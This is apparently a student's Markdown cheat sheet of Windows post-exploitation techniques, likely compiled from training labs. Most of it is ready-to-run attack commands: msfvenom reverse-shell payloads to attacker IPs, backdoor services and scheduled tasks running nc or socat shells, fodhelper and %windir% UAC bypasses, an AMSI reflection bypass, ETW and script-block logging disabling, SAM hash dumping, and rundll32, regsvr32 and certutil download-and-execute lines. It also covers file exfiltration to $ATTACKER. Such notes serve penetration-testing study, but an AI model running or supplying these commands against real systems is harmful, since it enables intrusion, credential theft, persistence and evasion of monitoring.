
- [Enumeration](#enumeration)
  - [Powershell](#powershell)
    - [Enum with Powershell](#enum-with-powershell)
  - [WMI](#wmi)
  - [Sysinternals Tools](#sysinternals-tools)
    - [Tools](#tools)
  - [Abusing Internals](#abusing-internals)
  - [Commands](#commands)
  - [Connecting with nc](#connecting-with-nc)
  - [Enumerate](#enumerate)
  - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
    - [Tampering with low users](#tampering-with-low-users)
    - [Dump hashs](#dump-hashs)
    - [Backdoor](#backdoor)
    - [Create/Modfiy Services](#createmodfiy-services)
    - [Schedule Tasks](#schedule-tasks)
    - [Logon as Trigger](#logon-as-trigger)
    - [Login Screen](#login-screen)
- [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
  - [GUI bypass](#gui-bypass)
  - [Auto Elevating](#auto-elevating)
  - [Enviroment Variable](#enviroment-variable)
- [Runtime Detection](#runtime-detection)
- [Evade Logging](#evade-logging)
  - [File Operation](#file-operation)
    - [BITSAdmin](#bitsadmin)
    - [FindStr](#findstr)
    - [Execution](#execution)
- [File Transfer](#file-transfer)
  - [Download](#download)
  - [Upload](#upload)
  - [Encrpytion](#encrpytion)
  - [Native tools](#native-tools)
- [Bypass Applocker](#bypass-applocker)
  - [Privilege Escalation](#privilege-escalation)
    - [Incognito](#incognito)
    - [Potato family](#potato-family)

## Enumeration

- Users, Version
  - Get-WmiObject
    - -Class win32_OperatingSystem | Win32_Process | Win32_Service | Win32_Bios | win32_useraccount
  - Get-ComputerInfo

### Powershell
- .NET framkework: software plattform für windows
- Commands = cmdlets
  - Verb-Noum
  - Get
  - Start
  - Stop
  - Read
  - Write
  - New
  - Out
- Get-Help [cmdlet] = display info
  - help
  - Update-Help
  - Help cmdlet-name -Online
- Get-Command
  - Verb-*
  - *-Npin
  - New.*
- Get-Alias
  - New-Alias -Name "Name of alias" Command
- Import-Module .\ScriptName.ps1 = all functions available
  - Get-Module | select Name,ExpotedCommands | fl

- Pipelines |
  - objects are passed
  - Verb-Noum | get-Member => Info about cmdled, object (properties and methods)
    - -MemberType Method/Property/ScriptProperty
  
- Properties
  - COMMAND | Get-Member -MemberType Methody,Property,Other

- Manipulate
  - Select-Object -Property
  - Where-Object => grep
    - -Property PropertyName -operator Value
    -  {$_.PropertyName -operator Value}
       -  -Property Status -eq Running
    -  -operator
       -  -Contains
       -  -EQ
       -  -GT
- Sort-Object
- Find FIle
  - Get-ChildItem -Recurse -Path "C:\" | Where-Object {$_.Name -match 'interesting*'}
  - Get-ChildItem \\IP-SMB\share
    - -Recurse
    - -Force
    - -Hidden
    - -Path
    - -ErrorAction
    - -Include "\*.EXT\*"
  - Select-String 
    -  -Pattern API_KEY
  
- Measure-Object = count
- Oldest -MaxEvent 1
- Base64
  - certutil.exe -decode INPUT_FILE OUTPUT_FILE
  - Encode: 
    - $Input = Textblablabla
    - $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    - $EncodedText =[Convert]::ToBase64String($Bytes)
    - $EncodedText
  - Decode
    - $ENCODED = Get-Content -Path "C:\Users\Administrator\Desktop\b64.txt"  
  -  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
  
#### Enum with Powershell
- COMMAND | get-member
- Get-LocalUser = show users
  - Where-Object {$_.SID -match 'S-1-5-21-1394777289-3961777894-1791813945-501'}
  - Get-LocalUser | Select-Object -Property Name,Enabled,SID
  - Get-LocalUser | Where-Object {$_.PasswordRequired -match 'False' } | measure-object
  
- Get-Localgroup
- Network
  - get-NetIPAddress
  - Get-NetTCPConnection 
  - Test-NetConnection
  - Invoke-WebRequest
    - curl in powershell
    - Remove-Item alias:curl = to use curl and not invoke
- Patches
  - Get-HotFix
- Scheduled-Task
  - Get-ScheduledTask
- Owner
  - Get-Acl
  
### WMI
- WMI = Windows Management Instrumentation
  - subsystem of powershell
  - status information
  - Config security setting on remote machine, setting and chaging user and group permission
  - modify system properties
  - Code exec
  - schedule
  - logging
- 
- Commands
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic ALIAS list brief
    - OS|BIOS|CPU|NIC|USERACCOUNT
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local system

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - -Force
    - -Recurse
    - -Path
    - -Include *.EXtension*
    - -File
    - -ErrocAction

- Powershell
  - [Get-WmiObject](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1)
    - -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft
  - [Invoke-WmiMethod](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/invoke-wmimethod?view=powershell-5.1)

- MMC
  - Microsoft Management Console
  - 
C
### Sysinternals Tools
- [LOLBAS](https://lolbas-project.github.io/#)
- [Where Download](https://learn.microsoft.com/en-us/sysinternals/downloads/)
- [Where Download 2](https://live.sysinternals.com/)
- Download
  - Install WebDAV
    - get-service webclient && start-service webclient ==> run webclient
    - control.exe /name Microsoft.NetworkAndSharingCenter ==> turn on network discovery
    - Install-WindowsFeature WebDAV-Redirector -Restart
    - Get-WindowsFeature WebDAV-Redirector | Format-Table -Autosize
  - Run
    - net use * \\live.sysinternals.com\tools\procmon.exe --accepteula
  - \\live.sysinternals.com\tools\procmon.exe --accepteula

```
# Troubeshoot

- services.msc + enable:
  - DNS Client
  - Function Discovery Resource Publication
  - SSDP Discovery
  - UPnP Device Host
```

#### Tools
- Process analyser
  - Procmon, Process Explorer, Process Hacker 2
- DLL
  - library with code and data shared by programs
  - modularization of code
  - code reuse
  - better memory usage
  - Dependency ==> target of hijacking/injection
  - Load?
    - *load-time dynamic*: calls to the dll (with header and import)
    - *run-time dynamic link*: separte function 
  
- PE = Portable Executable
  - .exe files

- Internals
  - Win64 API
  - interaction with memory
  - user x kernel mode ==> API call = Switching Point

- ASLR = Address Space Layout Randomization 

- **Sigcheck**
  - file version number
  - -u: VirusTotal
  - -e: image
  
- **Streams**
  - Downloaded file
  - streams Path\To\File --acepteula
  - get-item -path Path\to\file -stream * || get-content
  - file.txt:streamName.txt
  
- **SDelete**
  - Secure delete

- **TCPView**
  - all tcp and udp endpoints = resmon (Resource Monitor)
  
- **Autoruns**
  - autostart apps/scripts
  
- **ProcDump**
  - monitor cpu spikes + crash dumps
  - extract credentials from process
  - create dump ==> also with process explorer
  - procdump -ma PROCESS 
  - alternative: Out-Minidump
  
- **Process Explorer**
  - actice process + handles or dll
  - agent process, properties and threads
  - procexp
  
- **Process Monitor**
  - file system, registry and process/thread history
  - procmon
  
- **PsExec**
  - like telnet
  - psexec (psexec -accepteula -i -s cmd.exe)
  - psexec \\IP -accepteula -i -s DOMAIN\User run_smt
  - psexec \@hostname. -accepteula -i -s DOMAIN\User run_smt
  - Impacket SMBExec / impacket atexec
    - impacket-psexec user:pass@domain
  - crackmapexec smbexec atexec
  
- **Sysmon**
  - event log: process, network, file change and creation
  - [Config File](https://github.com/SwiftOnSecurity/sysmon-config)
  - Get-WinEvent | wevutil.exe 
  - Filter: Get-WinEvent
    - */System/EventID=ID
    - */EventData/Data[@Name="<XML Attribute/Name>"]
    - *EventData/Data=Data
    - Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
    - *LSASS* = Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'
    - *Malware*= Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=<Port>'
    - *Persistence* = Binary / app in the startup
    - *RegKey* = Modifications in registry
    - *Evasion* = 
  
- **WinObj**
  - NT Object Manager name space

- **BgInfo**
  - Sysinfo
- **RegJump**
  - RegJump Registry/Path
  - = reg query = Get-Item = Get-ItemProperty
- **Strings**
  - scan for UNICODE or ASCI

### Abusing Internals
- [Abusing Internals](https://tryhackme.com/room/abusingwindowsinternals)
- Basic steps
  - Open process
  - Allocate memory
  - write malicious code
  
- Injector
- hollowing - unmapping process
- Hijacking
- DLL
- Invoke function pointers
- Asynchronous procedure calls
- Section manipulation

- [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)

### Commands
- powershell -exec bypass
- powershell -ep bypass
  - Set-ExecutionPolicy Bypass -Scope Process
  - Get-ExecutionPolicy -List
- systeminof
  - part of Active Directory (workgroup / domain)

- Find 
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - Force
    - Recurse
    - Error
  - Test-NetConnection 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  - Open Ports:
    - netsh advfirewall firewall add rule name="ALLOW TCP PORT 80" dir=in action=allow protocol=TCP localport=80
    - netsh advfirewall firewall show rule name="ALLOW TCP PORT 80"
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

```
# Examples

(Get-ChildItem -File -Recurse | Measure-Object).Count
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

- findstr = grep

### Connecting with nc
- nc.exe TARGET PORT -e cmd.exe
  
### Enumerate

- **Check permisions**
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
  -  setspn -T medin -Q ​ */* 
- Invoke Kereberosast script:
  - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

```
# Docker Empire

## [isaudits/docker-empire](https://github.com/isaudits/docker-empire)
## [hoptimumthreat/powershell-empire-docker](https://github.com/hoptimumthreat/powershell-empire-docker)


docker run -it -p 80:80 \
-p 443:443 -p 8080:8080 \
-p 8081:8081 \
-v ~/Empire/tmp:/tmp \
-v ~/Empire/data:$(pwd)/Empire/data/downloads \
hoptimumthreat/powershell-empire
```

### Stabilize / Post Exploit / Persistance windows

#### Tampering with low users
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup {Administrators/"Backup Operators"| "Remote Management Users" | "Remote Desktop Users"} Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000 ==> Find hex
  - wmic useraccount get name,sid
  - PsExec64.exe -i -s regedit
  - In: HKLM\SAM\SAM\Domains\Account\Users\
    - Change in F to value of admin in HEX(little endian)

#### Dump hashs
reg.exe save hklm\sam C:\path\to\save\sam.save
reg.exe save hklm\security C:\path\to\save\security.save
reg.exe save hklm\system C:\path\to\save\system.save

python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL

#### Backdoor
- find executables and "batizar"
  - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
  - msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
- shortcut
  - point the shortcut to payload

- File association
  - HKLM\Software\Classes ==> reference to standard program = script to be loaded

#### Create/Modfiy Services
- **Create**
  - sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
  - sc.exe start THMservice
  - create service with msfvenom:
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
  
- **Modify**
  - sc.exe query state=all
    - sc.exe qc ServiceName
  - Important:
    - binary path name
    - start_type (auto)
    - start name (better localsystem)
    - lsmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
  - upload and edit:
    - sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
    - sc.exe qc THMservice3

#### Schedule Tasks
- schtasks
  - schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
- Hidding the task
  - remove Security Descriptor
    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
  -  PsExec64.exe -s -i regedit
  -  Delete task

#### Logon as Trigger
- **Executable on startup**
  - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  - Folge ALL: ProgramData\Windows\Start Menu\Programs\Startup

- **RunOnce**
  - Force run via registry
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
  - HKCU = current user
  - HKLM = All users
  - Run = logon
  - RunOnce = singletime
  - Create registry entry
    - REG_EXPAND_SZ in HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  
- **WinLogn**
  - Executed after authentication
  - HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
  - Userinit ==> userinit.exe = user profile preferences

- **Logon Scripts**
  - Only for current user
  - Variable: UserInitMprLogonScript
  - Assign logon script to user
  - HKCU\Environment ==> add Reg_Expand_Sy

#### Login Screen
- Sticky keys
  - 5 x shift = C:\Windows\System32\sethc.exe
  - take ownershipf of file + give permision + overwrite sethc,exe
    - takeown /f c:\Windows\System32\sethc.exe
    - icalcs c:\Windows\System32\sethc.exe /grant Administrator:F

- Utilman (patched)
  - Ease access 
  - c:\Windows\System32\sethc.exe


## Bypass User Account Control (UAC)
- New Process are runned as non-privileged-account
- Tokens
  - Normal user: 1
  - Admin: filtered (norma actions) + elevated (admin actions)
- Bypass ==> goint to elevated to IL (integrity level) high
- References
- [UAC git repository](https://github.com/hfiref0x/UACME)
- [Bypassing UAC](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
- [Way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)


[**Automated bypass**](https://github.com/hfiref0x/UACME)

### GUI bypass
- **msconfig** RUNS with IL high
    - shell from msconfing = high
- **azman.msc** ==> help ==> view source = open ==> all files

### Auto Elevating
- manifest ==> autoElevate (on/off)
- Change default programm execution in HKEY_Current_USer
  
```
# Define standard application
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

# Link the application to attacker programm
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

# Make the system used our choue
reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Add the created command as preference
reg add %REG_KEY% /d %CMD% /f

# execute fodhelper.exe

### After Windows Defender

set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Set command + Query = register delete, windows defender did not act so quickly
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% & fodhelper.exe

# Clean Steps
reg delete HKCU\Software\Classes\ms-settings\ /f
```

- Variations use other registry keys
```
# Powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force

Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force

Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# CMD
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

# Clean Steps:
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

### Enviroment Variable
- Task scheduler
- Rewrite Variable %windir% ==> HKCU\Environment
  - Add at the end = "&REM " = comment everything that exist after the variable name
  
```
# Payload to be executed instead of normal scheduled task
cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

# Adding the new registry
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# Cleanup new entries
reg delete "HKCU\Environment" /v "windir" /f
```

## Runtime Detection
- Scan code before execution
  - directly from memory
- CRL = Common Language Runtime
- DLR = Dynamic Language Runtime
- [Amsi Fail](http://amsi.fail/)

- How
  - Donwgrade powershell
  - Powershell -Version 2
  
```
https://github.com/trustedsec/unicorn

full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

- **Reflection**
```
# Reflection to modify and bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 1 - use assembly from Ref.Assembly
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# 2 - obtain .net assembly for PSEtwLogProvider, piped from the previous part of the command
.GetField('amsiInitFailed','NonPublic,Static')

# 3 - set field m_enabled do previous stored value
.SetValue($null,$true)
```

## Evade Logging
- Methodology
  - disable logging (1)
  - keep integrity (2)
  - clear logs (3)

- Logs are forwarded from endpoints to central device
- just deleting them may raise alerts
- Append to a .ps1 script

- **Check amount registered log entries - (2)**
```
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count

# Check Event Viewer
Microsoft/Windows/PowerShell/Operational 
```

- **Reflection - (1)**
```
# obtain .net assembly for PSEtwLogProvider
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

# store null value for etwProvider
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

# set field m_enabled do previous sotred value
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

 **Group Policy Takeover**
```
# Reflection to obtaim SM and identify GPO
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

# modify event provider to 4104 to 0  
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

# 4103
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

- **Disable Logging in ps session**
  - Append to script OR execute in session
  - Avoid sending logs to the pipeline

```
# Get target module
$module = Get-Module Microsoft.PowerShell.Utility 

# module execution details = false
$module.LogPipelineExecutionDetails = $false

# Get target ps-snapin
$snap = Get-PSSnapin Microsoft.PowerShell.Core

# Set ps-snapin execution details to false
$snap.LogPipelineExecutionDetails = $false
```

### File Operation

#### BITSAdmin
- create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
- bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe

#### FindStr
- dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
- dir n:\*cred* /s /b
- grep
- used to download from SMB
  - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
  - findstr /s /i cred n:\*.*

#### Execution
- Indirect command execution
- **File Explorer**
  - explorer.exe /root,"C:\Windows\System32\calc.exe"
- 
  
- **Rundll32**
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(123)
  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP:PORT/script.ps1');");

- **Regsvr32**
  - system32 = 32 bit
  - SysWOW64 = 64 bits
  - Execute binaries + bypass whitelistening
  - Steps
    1. create malicious dll: msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
    2. upload the file
    3. run it: regserv32.exe c:\path\to\file
    4. regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll 
       1. /s = silent
       2. /n = not call DLL register server
       3. /i = Use another server
       4. /u = run unregistered

- **WSL**
  - bash.exe -c "c:/path/to/file"

- **Shortcuts**
  - Target: rundll32, Powershell, Regsvr32.
  - [Atomic-red-team-T1023](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)

- **No Powershell**
  - [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
  - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
  - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
  - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj


## File Transfer
### Download

- **Enconding**
  - md5sum
  - [IO.File]::WriteAllBytes("C:\Path\To\File", [Convert]::FromBase64String("Encoded"))
    - Get-FileHash C:\Path\To\File -Algorithm md5
  
- **PowerShell Web Downalods**
  - (New-Object Net.Webclient).DownloadFile('Target URL', 'Output File')
  - powershell -c "(new-object System.Net.WebClient).Downloadfile('Target URL', 'Output File')
    - Net.WebClient = Class 
    - DownloadFile, DownloadDataAsync, DownloadFileAsync, DownloadString  = Method
  - Running in Memory = Invoke-Expression = IEX
    - iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1')
    - (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1') | IEX
    - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
    - [More examples from HarmJ0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

```
C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
```

- **Invoke-WebRequest:**
  - iwr, curl, wget
  - Invoke-WebRequest http://10.10.XX.XX/Invoke-MS16032.ps1 -OutFile PowerView.ps1
    - powershell -c Invoke-Webrequest http://Attcker/File -OutFile winPeas.bat
  - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"

- **Possible erros**
  - iwr -UseBasicParsing = Bypass internet explorer configuration
  - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} == if certificate is not tusted

- **SMB**
  - Attacker: smbserver.py
  - Target: copy \\$ATTACLER\Share\file
  - Authenticated:

```
# Attacker
impacket-smbserver share -smb2support /path/to/share -user USER -password PASS

# Target
net use n: \\$ATTACKER\share /user:USER PASS
```

- **FTP**
```
# Attacker
sudo python3 -m pyftpdlib --port 21

# Target
(New-Object Net.WebClient).DownloadFile('ftp://$ATTACKER/file.txt', 'C:\Users\Public\ftp-file.txt')

## Execute as file
echo open $ATTACKER > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt
```

### Upload
- **Base64**
  - [Convert]::ToBase64String((Get-Content -path "C:\Path\To\File" -Encoding byte))
    -  Get-FileHash C:\Path\To\File -Algorithm MD5 | select Hash
 - Decode
   - echo string | base64 -d
 - Send body of a http request

```
# Target 
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://$ATTACKER:8000/ -Method POST -Body $b64

# Attacker
nc -lvnp 8000
```

- [uploadserver](https://github.com/Densaugeo/uploadserver)
  - We upload PSUpload.psy ==> Invoke-RestMethod to upload
```
# Attacker
python3 -m uploadserver
sudo python3 -m pip install --user uploadserver

# Target
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://$ATTACKER:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

- **SMB**
  - using [WebDav](https://github.com/mar10/wsgidav)
  
```
# Attacker
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# Target
dir \\$ATTACKER\DavWWWRoot
  copy C:\Path\To\File \\192.168.49.129\DavWWWRoot\
dir \\$ATTACKER\sharefolder
  copy C:\Path\To\File \\192.168.49.129\sharefolder\
```

- **FTP**
```
# Attacker: create ftp server with write permissions
sudo python3 -m pyftpdlib --port 21 --write

# Target
(New-Object Net.WebClient).UploadFile('ftp://$ATTACKER/ftp-hosts', 'C:\Path\To\File')

## Execute as file
echo open $ATTACKER > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo put c:\Path\to\file >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt
```

- **PowerShell WinRM**
  - Execute commands on remote computer: Member of group | Admin | Permissions
```
Test-NetConnection -ComputerName COMPUTERNAME -Port 5985
$Session = New-PSSession -ComputerName COMPUTERNAME

# LH=DB
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# DB=LH
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### Encrpytion
- Upload ps1 script to target + import
  - Import-Module .\Invoke-AESEncryption.ps1
  - Output file.ext.aes

### Native tools
- [Windows - Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/)
  - /upload

- **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
- certification services
- dump + diplay certfication authority
- Ingress tool transfer
- Download
  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
- Encode / Decode
  - certutil -encode payload.exe Encoded-payload.txt
  - certutil -decode Encoded_file payload.txt
  
- copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')

## Bypass Applocker
- Applocker: restrict programs from being executed
- Windows 7 default
  - whitelisted directory
    - C:\Windows\System32\spool\drivers\color
- Windows history:
  - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

### Privilege Escalation
- Check privileges
